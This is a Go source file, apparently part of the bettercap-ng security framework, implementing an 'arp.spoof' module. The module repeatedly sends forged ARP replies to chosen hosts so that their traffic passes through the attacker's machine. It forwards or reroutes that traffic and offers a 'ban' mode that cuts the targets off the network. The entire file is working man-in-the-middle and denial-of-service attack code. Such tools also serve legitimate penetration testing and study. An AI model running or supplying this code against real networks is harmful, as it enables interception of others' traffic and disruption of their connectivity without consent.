package modules

import (
	"bytes"
	"fmt"
	"net"
	"runtime"
	"time"

	"github.com/evilsocket/bettercap-ng/log"
	network "github.com/evilsocket/bettercap-ng/net"
	"github.com/evilsocket/bettercap-ng/packets"
	"github.com/evilsocket/bettercap-ng/session"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/malfunkt/iprange"
)

type ArpSpoofer struct {
	session.SessionModule
	done      chan bool
	addresses []net.IP
	ban       bool
}

func NewArpSpoofer(s *session.Session) *ArpSpoofer {
	p := &ArpSpoofer{
		SessionModule: session.NewSessionModule("arp.spoof", s),
		done:          make(chan bool),
		addresses:     make([]net.IP, 0),
		ban:           false,
	}

	p.AddParam(session.NewStringParameter("arp.spoof.targets", session.ParamSubnet, "", "IP addresses to spoof."))

	p.AddHandler(session.NewModuleHandler("arp.spoof on", "",
		"Start ARP spoofer.",
		func(args []string) error {
			return p.Start()
		}))

	p.AddHandler(session.NewModuleHandler("arp.ban on", "",
		"Start ARP spoofer in ban mode, meaning the target(s) connectivity will not work.",
		func(args []string) error {
			p.ban = true
			return p.Start()
		}))

	p.AddHandler(session.NewModuleHandler("arp.spoof/ban off", "arp\\.(spoof|ban) off",
		"Stop ARP spoofer.",
		func(args []string) error {
			return p.Stop()
		}))

	return p
}

func (p ArpSpoofer) Name() string {
	return "arp.spoof"
}

func (p ArpSpoofer) Description() string {
	return "Keep spoofing selected hosts on the network."
}

func (p ArpSpoofer) Author() string {
	return "Simone Margaritelli <evilsocket@protonmail.com>"
}

func (p *ArpSpoofer) getMAC(ip net.IP, probe bool) (net.HardwareAddr, error) {
	var mac string
	var hw net.HardwareAddr
	var err error

	// do we have this ip mac address?
	mac, err = network.ArpLookup(p.Session.Interface.Name(), ip.String(), false)
	if err != nil && probe == true {
		from := p.Session.Interface.IP
		from_hw := p.Session.Interface.HW

		if err, probe := packets.NewUDPProbe(from, from_hw, ip, 139); err != nil {
			log.Error("Error while creating UDP probe packet for %s: %s", ip.String(), err)
		} else {
			p.Session.Queue.Send(probe)
		}

		time.Sleep(500 * time.Millisecond)

		mac, err = network.ArpLookup(p.Session.Interface.Name(), ip.String(), false)
	}

	if mac == "" {
		return nil, fmt.Errorf("Could not find hardware address for %s.", ip.String())
	}

	mac = network.NormalizeMac(mac)
	hw, err = net.ParseMAC(mac)
	if err != nil {
		return nil, fmt.Errorf("Error while parsing hardware address '%s' for %s: %s", mac, ip.String(), err)
	}

	return hw, nil
}

func (p *ArpSpoofer) sendArp(saddr net.IP, smac net.HardwareAddr, check_running bool, probe bool) {
	for _, ip := range p.addresses {
		if check_running && p.Running() == false {
			return
		} else if p.Session.Skip(ip) == true {
			log.Debug("Skipping address %s from ARP spoofing.", ip)
			continue
		}

		// do we have this ip mac address?
		hw, err := p.getMAC(ip, probe)
		if err != nil {
			log.Debug("Error while looking up hardware address for %s: %s", ip.String(), err)
			continue
		}

		if err, pkt := packets.NewARPReply(saddr, smac, ip, hw); err != nil {
			log.Error("Error while creating ARP spoof packet for %s: %s", ip.String(), err)
		} else {
			log.Debug("Sending %d bytes of ARP packet to %s:%s.", len(pkt), ip.String(), hw.String())
			p.Session.Queue.Send(pkt)
		}
	}
}

func (p *ArpSpoofer) unSpoof() error {
	from := p.Session.Gateway.IP
	from_hw := p.Session.Gateway.HW

	log.Info("Restoring ARP cache of %d targets.", len(p.addresses))

	p.sendArp(from, from_hw, false, false)

	return nil
}

func (p *ArpSpoofer) pktRouter(eth *layers.Ethernet, ip4 *layers.IPv4, pkt gopacket.Packet) {
	if eth == nil || ip4 == nil {
		return
	}
	// If DST_MAC is not our Interface.IP ignore
	if bytes.Compare(eth.DstMAC, p.Session.Interface.HW) != 0 {
		return
	}

	// check if this packet is from or to one of the spoofing targets
	// and therefore needs patching and forwarding.
	for _, target := range p.addresses {
		// packet not from/to this target
		if !ip4.SrcIP.Equal(target) && !ip4.DstIP.Equal(target) {
			continue
		}

		targetMAC, err := p.getMAC(target, false)
		if err != nil {
			log.Error("Error retrieving target MAC address for %s", target.String(), err)
			continue
		}

		isEthFromTarget := bytes.Compare(eth.SrcMAC, targetMAC) == 0
		// If SRC_MAC is different from both TARGET(s) & GW ignore
		if isEthFromTarget == false && bytes.Compare(eth.SrcMAC, p.Session.Gateway.HW) != 0 {
			continue
		}

		// log.Info("Got packet to route: %s\n", pkt.String())

		if isEthFromTarget {
			copy(eth.SrcMAC, p.Session.Interface.HW)
			copy(ip4.SrcIP, p.Session.Interface.IP)
			copy(eth.DstMAC, p.Session.Gateway.HW)
			copy(ip4.DstIP, ip4.DstIP)

			log.Info("Target is sending")
		} else {
			copy(eth.SrcMAC, p.Session.Interface.HW)
			copy(ip4.SrcIP, p.Session.Interface.IP)
			copy(eth.DstMAC, targetMAC)
			copy(ip4.DstIP, target)

			log.Info("Gateway is sending")
		}

		data := pkt.Data()
		if err := p.Session.Queue.Send(data); err != nil {
			log.Error("Could not reinject packet: %s", err)
		}
	}
}

func (p *ArpSpoofer) Configure() error {
	var err error
	var targets string

	if err, targets = p.StringParam("arp.spoof.targets"); err != nil {
		return err
	}

	list, err := iprange.Parse(targets)
	if err != nil {
		return fmt.Errorf("Error while parsing arp.spoof.targets variable '%s': %s.", targets, err)
	}
	p.addresses = list.Expand()

	if p.ban == true {
		log.Warning("Running in BAN mode, forwarding not enabled!")
		p.Session.Firewall.EnableForwarding(false)
	} else if runtime.GOOS == "windows" {
		log.Warning("Using user space packet forwarding (Windows sucks), performance will be slow.")
		p.Session.Queue.Route(p.pktRouter)
	} else if p.Session.Firewall.IsForwardingEnabled() == false {
		log.Info("Enabling forwarding.")
		p.Session.Firewall.EnableForwarding(true)
	}

	return nil
}

func (p *ArpSpoofer) Start() error {
	if err := p.Configure(); err != nil {
		return err
	}

	return p.SetRunning(true, func() {
		from := p.Session.Gateway.IP
		from_hw := p.Session.Interface.HW

		log.Info("ARP spoofer started, probing %d targets.", len(p.addresses))

		for p.Running() {
			p.sendArp(from, from_hw, true, false)
			time.Sleep(1 * time.Second)
		}

		p.done <- true
	})
}

func (p *ArpSpoofer) Stop() error {
	return p.SetRunning(false, func() {
		log.Info("Waiting for ARP spoofer to stop ...")
		<-p.done
		p.unSpoof()
		p.ban = false
		p.Session.Queue.Route(nil)
	})
}
